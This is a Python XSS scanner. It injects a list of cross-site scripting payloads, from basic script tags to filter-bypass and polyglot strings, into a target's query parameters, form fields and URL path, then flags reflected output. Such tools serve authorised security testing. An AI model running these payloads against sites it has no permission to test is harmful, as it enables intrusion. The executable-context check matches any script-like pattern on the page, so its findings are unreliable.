#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Scanner
Tests for reflected, stored, and DOM-based XSS vulnerabilities
"""

import requests
import urllib.parse
import json
import re
from bs4 import BeautifulSoup
from datetime import datetime

class XSSScanner:
    """XSS vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # XSS payloads - from simple to complex
        self.payloads = [
            # Basic payloads
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",

            # Bypass filters
            '<ScRiPt>alert(1)</sCrIpT>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',

            # Event handlers
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',

            # Advanced bypasses
            '<svg><script>alert&#40;1&#41;</script>',
            '<img src=x onerror=alert`1`>',
            'javascript:alert(1)',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',

            # Polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//',
            '--><script>alert(1)</script>',
            '</script><script>alert(1)</script>',
        ]

    def scan(self):
        """Run XSS scan"""
        print(f"[*] Starting XSS scan on {self.target_url}")

        # Test GET parameters
        self._test_get_parameters()

        # Test form inputs
        self._test_forms()

        # Test URL path
        self._test_url_path()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_get_parameters(self):
        """Test GET parameters for XSS"""
        try:
            parsed = urllib.parse.urlparse(self.target_url)
            params = urllib.parse.parse_qs(parsed.query)

            if not params:
                # If no params, try adding test parameter
                params = {'test': ['value']}

            for param_name in params.keys():
                for payload in self.payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    # Build test URL
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                    if self._test_payload(test_url, param_name, payload, 'GET'):
                        break  # Found vulnerability, move to next param

        except Exception as e:
            print(f"[!] Error testing GET parameters: {e}")

    def _test_forms(self):
        """Test HTML forms for XSS"""
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')
            print(f"[*] Found {len(forms)} forms to test")

            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()

                # Build full action URL
                if action:
                    action_url = urllib.parse.urljoin(self.target_url, action)
                else:
                    action_url = self.target_url

                # Get all inputs
                inputs = form.find_all(['input', 'textarea', 'select'])
                form_data = {}

                for input_field in inputs:
                    name = input_field.get('name')
                    if name:
                        form_data[name] = 'test_value'

                # Test each input field
                for field_name in form_data.keys():
                    for payload in self.payloads:
                        test_data = form_data.copy()
                        test_data[field_name] = payload

                        if method == 'POST':
                            if self._test_post_payload(action_url, test_data, field_name, payload):
                                break
                        else:
                            # Construct GET URL
                            query_string = urllib.parse.urlencode(test_data)
                            test_url = f"{action_url}?{query_string}"
                            if self._test_payload(test_url, field_name, payload, 'GET Form'):
                                break

        except Exception as e:
            print(f"[!] Error testing forms: {e}")

    def _test_url_path(self):
        """Test URL path for XSS"""
        try:
            parsed = urllib.parse.urlparse(self.target_url)
            base_path = parsed.path.rstrip('/')

            for payload in self.payloads[:5]:  # Test only basic payloads for path
                test_path = f"{base_path}/{urllib.parse.quote(payload)}"
                test_url = f"{parsed.scheme}://{parsed.netloc}{test_path}"

                self._test_payload(test_url, 'URL_PATH', payload, 'PATH')

        except Exception as e:
            print(f"[!] Error testing URL path: {e}")

    def _test_payload(self, url, param_name, payload, method):
        """Test a single payload"""
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)

            # Check if payload is reflected in response
            if self._is_reflected(response.text, payload):
                # Check if it's in executable context
                if self._is_executable(response.text, payload):
                    vuln = {
                        'type': 'XSS',
                        'severity': 'high',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': 'Payload reflected in executable context'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] XSS found: {param_name} via {method}")
                    return True

        except requests.exceptions.RequestException as e:
            pass  # Silently skip failed requests
        except Exception as e:
            print(f"[!] Error testing payload: {e}")

        return False

    def _test_post_payload(self, url, data, field_name, payload):
        """Test POST payload"""
        try:
            response = self.session.post(url, data=data, timeout=10, allow_redirects=True)

            if self._is_reflected(response.text, payload):
                if self._is_executable(response.text, payload):
                    vuln = {
                        'type': 'XSS',
                        'severity': 'high',
                        'url': url,
                        'parameter': field_name,
                        'payload': payload,
                        'method': 'POST',
                        'evidence': 'Payload reflected in executable context'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] XSS found: {field_name} via POST")
                    return True

        except Exception as e:
            pass

        return False

    def _is_reflected(self, response_text, payload):
        """Check if payload is reflected in response"""
        # Decode HTML entities for comparison
        decoded_response = response_text.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"')

        # Check for exact match or partial match
        return payload in response_text or payload in decoded_response

    def _is_executable(self, response_text, payload):
        """Check if payload could execute (not properly encoded)"""
        # Check if dangerous characters are not encoded
        dangerous_patterns = [
            r'<script[^>]*>',
            r'on\w+\s*=',
            r'<iframe',
            r'<img[^>]+onerror',
            r'<svg[^>]+onload',
            r'javascript:',
        ]

        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                # Check if our payload or similar pattern exists nearby
                return True

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 xss_scanner.py <url>")
        sys.exit(1)

    scanner = XSSScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")
